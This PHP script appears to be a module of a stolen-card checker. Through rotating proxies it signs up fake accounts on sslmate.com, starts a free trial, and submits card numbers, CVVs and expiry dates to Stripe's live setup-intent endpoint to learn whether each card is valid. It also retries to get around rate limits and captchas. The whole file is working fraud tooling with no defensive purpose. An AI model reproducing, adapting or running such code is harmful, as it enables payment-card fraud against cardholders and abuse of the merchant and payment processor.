<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://sslmate.com/signup?for=certspotter', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$csrf_v1 = $this->getstr($r1->body, 'name="csrf_token" value="', '"');

if (empty($csrf_v1)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$data = [
	'csrf_token' => $csrf_v1,
	'username' => $fake->user,
	'email' => $fake->email,
	'password' => 'CBAzyx321',
	'submit_btn' => 'Create My Account'
];

$r2 = $this->curlx->Post('https://sslmate.com/signup?for=certspotter', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

if (strpos($r2->body, 'Too Many Requests') !== false) {
	$empty = 'Too Many Requests';

	goto start;
}

$csrf_v2 = $this->getstr($r2->body, 'name="csrf_token" value="', '"');

if (empty($csrf_v2)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = [
	'csrf_token' => $csrf_v2,
	'free_trial' => 'yes',
	'term' => 'monthly',
	'plan' => 'hobbyist'
];

$r3 = $this->curlx->Post('https://sslmate.com/console/monitoring/onboarding', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$csrf_v3 = $this->getstr($r3->body, 'name="csrf_token" value="', '"');

if (empty($csrf_v3)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$data = [
	'csrf_token' => $csrf_v3,
];

$r4 = $this->curlx->Post('https://sslmate.com/console/create_stripe_setup_intent', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$json_r4 = json_decode($r4->body);

$seti_secret = $json_r4->client_secret ?? '';

$seti = explode('_secret_', $seti_secret)[0] ?? '';

if (empty($seti)) {
	$empty = 'Fourth Request Token is Empty';

	goto start;
}

$data = 'payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F13a1d358b%3B+stripe-js-v3%2F13a1d358b&payment_method_data[time_on_page]='.rand(50000, 100000).'&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_AZE9GUp1xSOBnn6iDBqVUiqo&client_secret='.$seti_secret;

$r5 = $this->curlx->Post('https://api.stripe.com/v1/setup_intents/'.$seti.'/confirm', $data, null, $cookie, $server['proxy']);

if (!$r5->success) goto start;

if (strpos($r5->body, 'verify_challenge') !== false) {
	$empty = 'Fifth Request Contains HCaptcha';

	goto start;
}

$json_r5 = json_decode($r5->body);

if (isset($json_r5->error)) {
	$status = $this->response->ErrorHandler($json_r5->error);

	goto end;
}

$status = $this->response->Stripe($r5->body, null, 'auth');

end: